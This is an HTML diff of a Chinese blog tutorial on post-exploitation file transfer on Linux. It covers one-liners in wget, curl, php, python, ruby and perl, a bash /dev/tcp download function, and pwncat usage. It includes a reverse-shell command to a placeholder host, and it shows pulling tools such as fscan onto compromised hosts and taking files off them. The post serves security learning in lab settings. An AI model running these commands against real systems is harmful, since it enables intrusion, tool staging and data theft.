@@ -1,0 +1,120 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="后渗透之文件下载(Linux篇)"><meta name="keywords" content=""><meta name="author" content="Kevin_xiao"><meta name="copyright" content="Kevin_xiao"><title>后渗透之文件下载(Linux篇) | Kevin_xiao's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  hexoVersion: '6.3.0'
+} </script><meta name="generator" content="Hexo 6.3.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%9E%8B"><span class="toc-number">2.</span> <span class="toc-text">基础型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#wget"><span class="toc-number">2.1.</span> <span class="toc-text">wget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#curl"><span class="toc-number">2.2.</span> <span class="toc-text">curl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php"><span class="toc-number">2.3.</span> <span class="toc-text">php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python"><span class="toc-number">2.4.</span> <span class="toc-text">python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ruby"><span class="toc-number">2.5.</span> <span class="toc-text">ruby</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#perl"><span class="toc-number">2.6.</span> <span class="toc-text">perl</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7%E5%9E%8B"><span class="toc-number">3.</span> <span class="toc-text">高级型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89Linux%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">自定义Linux函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwncat"><span class="toc-number">3.2.</span> <span class="toc-text">pwncat</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.jpg"></div><div class="author-info__name text-center">Kevin_xiao</div><div class="author-info__description text-center"></div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/kevinx1ao">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">3</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/bj.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Kevin_xiao's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/friends">Friends</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">后渗透之文件下载(Linux篇)</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2024-02-01</time><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">2.2k</span><span class="post-meta__separator">|</span><span>Reading time: 7 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前在p神的知识星球里发过一版，因为那里师傅们水平都比较高，所以只介绍了几种比较极端的下载方式，放博客上这个主要还是面对刚入门的师傅的，讲细节一些，所以先介绍一些比较入门的方法再分享比较高级的方法。</p>
+<h1 id="基础型"><a href="#基础型" class="headerlink" title="基础型"></a>基础型</h1><p>为什么在后渗透的时候需要下载文件呢，对于一般的情况，比如有网站服务的php网站，那我们可以直接写马连蚁剑，然后把文件拖进去就行了。需要传文件主要是因为打内网的时候需要传代理软件建立代理以及传fscan之类的工具，如果没有现成的网站服务想传文件就比较麻烦了，比如只是弹了个shell，这时我们就需要靠linux上一些现成的命令来下载文件了。</p>
+<p>因为我自己是有vps的，有公网服务，所以我一般会直接把要传的文件放在网站服务的目录，这样直接访问”<a href="http://ip:port/文件”就可以访问到想下载的文件了，平时打内网的话要传的一般也就是fscan和Stowaway，fscan是拿来扫内网的，Stowaway是用来建立代理，如何建立代理可以看我之前写的[内网代理搭建](https://fushuling.com/index.php/2023/09/21/%e5%86%85%e7%bd%91%e4%bb%a3%e7%90%86%e6%90%ad%e5%bb%ba/)。">http://ip:port/文件”就可以访问到想下载的文件了，平时打内网的话要传的一般也就是fscan和Stowaway，fscan是拿来扫内网的，Stowaway是用来建立代理，如何建立代理可以看我之前写的[内网代理搭建](https://fushuling.com/index.php/2023/09/21/%e5%86%85%e7%bd%91%e4%bb%a3%e7%90%86%e6%90%ad%e5%bb%ba/)。</a></p>
+<h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><p>wget是linux上的命令行的下载工具，也是平时用的最多的命令，春秋云镜上的环境都比较正常，一般这个命令都有，不会像之前那个比赛一样那么抽象。用法为(不指定端口的话就是默认网站服务的端口)：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://ip:port/文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-12.png"></p>
+<h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p>curl命令除了用于访问网站也可以用于下载文件，用法为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -O http://ip:port/文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F1020-1.png"></p>
+<p>这两种是最常见的，还有一些命令比如nc ssh resync也可以用来下载文件，只是感觉用法比较抽象而且不是很实用，具体可以看看<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/248686.html">后渗透系列之下载文件（Linux篇）</a></p>
+<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><p>如果你拿到shell的是一个php的站，一般来说是能直接写马然后连蚁剑的，用蚁剑直接传文件就行了，不过这里也介绍一下怎么用php命令来下载文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r &quot;file_put_contents(&#x27;保存到本地的路径&#x27;, fopen(&#x27;远程文件的URL&#x27;, &#x27;r&#x27;));&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F10204.png"></p>
+<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><p>如果你拿到shell的是一个python的站，可以用python执行代码实现文件下载：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import urllib.request;urllib.request.urlretrieve(&#x27;远程文件的URL&#x27;, &#x27;保存到本地的路径&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F1020-2.png"></p>
+<h2 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h2><p>如果环境里有ruby也可以用ruby执行代码下载文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ruby -e &quot;require &#x27;open-uri&#x27;; open(&#x27;远程文件的URL&#x27;) &#123;|f| File.open(&#x27;保存到本地的路径&#x27;, &#x27;wb&#x27;) &#123;|file| file.puts f.read&#125; &#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F1020-3.png"></p>
+<h2 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h2><p>有些linux服务器里自带的就有perl语言，我们也可以用perl执行代码下载文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl -e &quot;use LWP::Simple; getstore(&#x27;远程文件的URL&#x27;, &#x27;保存到本地的路径&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F1020-4.png"></p>
+<p>有师傅肯定要问了，那用java可以实现这种功能吗，我试了下必须得指定库，不是很好用，没有啥通用的方法，这里就不分享了。</p>
+<h1 id="高级型"><a href="#高级型" class="headerlink" title="高级型"></a>高级型</h1><h2 id="自定义Linux函数"><a href="#自定义Linux函数" class="headerlink" title="自定义Linux函数"></a>自定义Linux函数</h2><p>linux里可以把一些重复使用的命令封装成一个集合,之后可以使用函数名调用，因此我们可以自己写一个download函数，大概原理就是使用&#x2F;dev&#x2F;tcp设备文件与服务器建立TCP连接，并发送HTTP请求获取文件内容，最后将文件内容打印到标准输出，最后把输出重定向就可以获得文件了。在命令行输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function DOWNLOAD() &#123;</span><br><span class="line">  url=$1</span><br><span class="line">  proto=&quot;http://&quot;</span><br><span class="line">  host=$&#123;url/$proto/&#125;</span><br><span class="line">  server=$&#123;host%%/*&#125;</span><br><span class="line">  path=$&#123;host#*/&#125;</span><br><span class="line">  DOC=/$&#123;path// /&#125;</span><br><span class="line">  HOST=$&#123;server/:*/&#125;</span><br><span class="line"></span><br><span class="line">  PORT=$&#123;server/*:/&#125;</span><br><span class="line">  [[ -n $&#123;PORT&#125; ]] || PORT=80</span><br><span class="line">  PORT=$(( PORT + 0 ))</span><br><span class="line"></span><br><span class="line">  exec 3&amp;lt;&amp;gt;/dev/tcp/$&#123;HOST&#125;/$&#123;PORT&#125;</span><br><span class="line">  echo -en &quot;GET $&#123;DOC&#125; HTTP/1.0\r\nHost: $&#123;HOST&#125;\r\n\r\n&quot; &amp;gt;&amp;amp;3</span><br><span class="line">  while IFS= read -r line ; do</span><br><span class="line">    [[ &quot;$&#123;line&#125;&quot; == $&#x27;\r&#x27; ]] &amp;amp;&amp;amp; break</span><br><span class="line">  done &amp;lt;&amp;amp;3</span><br><span class="line">  nul=&#x27;\0&#x27;</span><br><span class="line">  while IFS= read -d &#x27;&#x27; -r x || &#123; nul=&quot;&quot;; [ -n &quot;$x&quot; ]; &#125;; do</span><br><span class="line">    printf &quot;%s$&#123;nul&#125;&quot; &quot;$&#123;x&#125;&quot;</span><br><span class="line">  done &amp;lt;&amp;amp;3</span><br><span class="line">  exec 3&amp;gt;&amp;amp;-</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F1697763811.png" alt="img"></p>
+<p>接着回车</p>
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F1697763856.png" alt="img"></p>
+<p>然后就可以使用自定义的DOWNLOAD函数下载文件了，输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DOWNLOAD http://url:port/fscan &amp;gt;fscan</span><br></pre></td></tr></table></figure>
+
+<p>即可成功远程下载文件</p>
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-1.png" alt="img"></p>
+<p>缺点是同一套代码不同系统可能不适用，得不同环境不同写法，我这个在centos测试成功了，然后ubuntu下也适用：</p>
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-11.png" alt="img"></p>
+<p>其他环境不敢保证，同时取消自定义函数的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unset DOWNLOAD</span><br></pre></td></tr></table></figure>
+
+<h2 id="pwncat"><a href="#pwncat" class="headerlink" title="pwncat"></a>pwncat</h2><p>pwncat是一款功能强大的反向Shell&amp;BindShell处理工具，同时也是一个主要针对Linux系统为测试目标的后渗透漏洞利用开发平台，最近开发者已经加入了对windows系统的支持。</p>
+<p>pwncat可以用于<strong>代替nc进行反弹shell的接收</strong>，pwncat可以拦截与远程shell的原始通信，并允许用户在远程主机上执行自动化操作，包括枚举、植入安装甚至权限升级。同时，pwncat还会自动优化shell，包括但不限于：</p>
+<ul>
+<li>在远程 shell 中禁用历史记录</li>
+<li>规范化 shell 提示符</li>
+<li>寻找有用的二进制文件</li>
+<li>尝试生成一个伪终端（pty）以进行完整的交互式会话</li>
+</ul>
+<p>pwncat官方出了操作文档：<a target="_blank" rel="noopener" href="https://pwncat.readthedocs.io/en/latest/commands/download.html">https://pwncat.readthedocs.io/en/latest/commands/download.html</a>，里面介绍了一些插件功能：</p>
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-2.png" alt="img"></p>
+<p>简单看了下功能分别是：</p>
+<ul>
+<li>Alias:命令取别名</li>
+<li>Back:从pwncat返回远程shell(按ctrl D可以从远程shell返回pwncat)</li>
+<li>Bind:绑定命令</li>
+<li>Connect:建立 pwncat 会话，实现反向和绑定 shell 的通信通道</li>
+<li>Download:通过利用 gtfobins框架定位受害主机上的文件读取器并通过管道将内容写回来实现文件读取</li>
+<li>Escalate:用于提权</li>
+<li>lcd:更改pwncat实例的本地工作目录</li>
+<li>load:从python包加载自定义pwncat模块</li>
+<li>Listen:创建一个新的后台侦听器以通过反向 shell 负载异步建立会话</li>
+<li>Listeners:管理活动和停止的侦听器</li>
+<li>lpwd:打印当前本地工作目录</li>
+<li>run:访问pwncat模块</li>
+<li>Info:获取指定模块的文档&#x2F;帮助信息</li>
+<li>Search:搜索模块</li>
+<li>Use:进入模块的上下文</li>
+<li>Upload:通过gtfobins模块枚举远程主机上可打印或者可写二进制数据的本地文件以实现文件的上传，好处是上传通过与shell相同的连接进行，不需要格外的连接。</li>
+</ul>
+<p>因此pwncat里有现成的文件上传插件以及一堆其他好用的功能，用于代替nc接收反弹的shell非常方便</p>
+<p>下载路径：<a target="_blank" rel="noopener" href="https://github.com/calebstewart/pwncat">https://github.com/calebstewart/pwncat</a></p>
+<p>pwncat需要3.9以上的Python版本，安装方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m pip install pwncat-cs -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone git@github.com:calebstewart/pwncat.git</span><br><span class="line">cd pwncat</span><br><span class="line">python -m poetry install</span><br><span class="line">#进入与外界隔离的虚拟环境</span><br><span class="line">python -m poetry shell</span><br></pre></td></tr></table></figure>
+
+<p>我是用第二种方法安装的，首先输入python -m poetry shell，此时我们的命令前面多了一个(pwncat-cs-py3.10)，会进入一个和外界隔离的虚拟环境</p>
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-3.png" alt="img"></p>
+<p>接着输入pwncat-cs -lp 9383就可以接收弹到9383端口上的shell，类似于nc -lvvp 9383</p>
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-4.png" alt="img"></p>
+<p>接着我们从本地的虚拟机弹个shell上去看看pwncat怎么操作的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/x.x.x.x/9383 0&amp;gt;&amp;amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到我们成功接收到了shell，有一个(local)来标志现在是pwncat界面不是远程shell界面</p>
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-5.png" alt="img"></p>
+<p>这时我们输入back，就可以成功从pwncat跳到远程shell上</p>
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-6.png" alt="img"></p>
+<p>按ctrl D可以从远程shell返回pwncat，我们来试试从远程主机下一个文件，从远程主机的desktop下一个flag.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">download /home/fushuling/Desktop/flag.txt ./flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-8.png" alt="img"></p>
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-7.png" alt="img"></p>
+<p>可以看到本地确实多了个flag.txt，接着试试远程上传文件，把本地的test.txt传到远程主机的桌面上</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload ./test.txt /home/fushuling/Desktop/test.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-9.png" alt="img"></p>
+<p>输入exit就可以退出了</p>
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023%2F10%2F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-10.png" alt="img"></p>
+<p>msf是可以通过执行生成的命令直接上线的，上线之后可以使用msf的upload功能上传文件，因为我msf用的不多，这里推荐一篇其他师傅的文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43847838/article/details/127623761">一条命令上线MSF(Metasploit)-web_delivery模块</a></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Kevin_xiao</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://kevinx1ao.github.io/2024/02/01/后渗透之文件下载(Linux篇)/">https://kevinx1ao.github.io/2024/02/01/后渗透之文件下载(Linux篇)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2024/02/01/%E5%AE%9E%E7%8E%B0%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"><i class="fa fa-chevron-left">  </i><span>实现交互式shell的几种方式</span></a></div><div class="next-post pull-right"><a href="/2024/02/01/hello-world/"><span>Hello World</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(/img/bj.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2023 - 2024 By Kevin_xiao</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
